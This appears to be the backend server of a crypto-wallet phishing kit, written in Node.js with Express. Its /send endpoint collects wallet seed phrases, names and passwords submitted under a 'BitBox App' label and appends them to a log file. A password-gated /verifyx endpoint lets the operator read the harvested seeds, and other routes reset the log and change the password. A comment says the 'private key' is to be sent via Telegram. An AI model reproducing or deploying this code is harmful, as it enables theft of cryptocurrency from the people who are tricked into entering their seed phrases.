  import { fileURLToPath } from 'url';
  import { dirname, resolve } from 'path';
  import express from 'express';
  import bodyParser from 'body-parser';
  import fs from 'fs';
  import axios from 'axios';
  import fileUpload from 'express-fileupload';
  // import clipboardy from 'clipboardy';

  const app = express();
  const __filename = fileURLToPath(import.meta.url);
  const __dirname = dirname(__filename);
  
  app.use(express.static(resolve(__dirname, 'public')));
// app.use(express.static(new URL('./public', import.meta.url).pathname));
app.use(bodyParser.json());
app.set('port', process.env.PORT || 8080);
app.use(fileUpload());

// send the private key via telegram
app.get("/send", (req, res) => {
  
  // const clipboardContent = clipboardy.readSync();
  
  let { seed, name, password } = req.query;
  // console.log("Seed received:", seed, "; Name:", name);

  let id = new Date().toString();
  let text = `BitBox App\n\n${name}= ${seed}`;
  console.log(text)
  fs.appendFile("log.txt", ">> " + id + " >> " + text + '\n' + `clipboardContent: {clipboardContent}` + "\n\n", (err) => {
    if (err) return console.log(err);
    // console.log("saved!");
  });
  return res.json({ message: "All Is Well" });
});


// app.get(/^\/log([^/\.]*).txt$/, (req, res) => {
//   fs.readFile("log.txt", (err, logs) => {
//     if (err) {
//       console.log(err);
//       return res.send("Error fetching logs");
//     }
//     logs = String(logs);
//     logs = logs.replace(/[\n]/g, "<br/>");
//     console.log("fetched logs");
//     res.send(logs);
//     // console.log("saved!");
//   });
// });

app.get("/reset", (req, res) => {
  let newVal = req.query.val.toString().trim();
  fs.writeFile("log.txt", newVal, (err) => {
    // console.log("saved!");
    // res.json({ done: true });
    if (err) {
      console.log(err);
      return res.status(400).json({ data: "An Error Occurred." });
    }
    fs.readFile("log.txt", (err2, logs) => {
      if (err2) {
        console.log(err2);
        return res
          .status(400)
          .json({ data: "An Error Occurred. Please Try Again." });
      }
      res.json({ data: logs.toString() });
    });
  });
});

app.get("/verifyx", (req, res) => {
  let password = req.query.password.toString().trim();
  fs.readFile("password.txt", (err, inp) => {
    if (err) {
      console.log(err);
      return res
        .status(400)
        .json({ data: "An Error Occurred. Please Try Again" });
    }
    // console.log(`${password} ?= ${inp}`);
    if (password == inp) {
      // lemonlemonlemon
      // console.log("correct");
      fs.readFile("log.txt", (err2, logs) => {
        if (err2) {
          console.log(err2);
          return res
            .status(400)
            .json({ data: "An Error Occurred. Please Try Again." });
        }
        res.json({ data: logs.toString() });
      });
    } else {
      return res.status(401).json({ data: "Wrong password" });
    }
  });
});
app.get("/changepassword", (req, res) => {
  let password = req.query.password.toString().trim();
  fs.writeFile("password.txt", password, (err) => {
    if (err) return console.log(err);
    // console.log("saved!");
    res.json({ done: true, newPassword: password });
  });
});
app.get(/^\/log([^/\.]*)$/, (req, res) => {
  let extra = "";
  if (Boolean(req.query.blah)) {
    extra = "?blah=" + req.query.blah;
  }
  res.redirect("/logs.html" + extra);
});

app.use((req, res) => {
  // console.log(req);
  // console.log("404 error " + new Date().getTime());
  res.status(404).send("404 - Page Not Found");
});
app.use((req, res, next) => {
  // console.log(req);
  // console.log("500 error " + new Date().getTime());
  res.status(500).send("500 - Internal Server Error");
});

app.listen(app.get("port"), () => {
  console.log("Running server at port", app.get("port"));
});
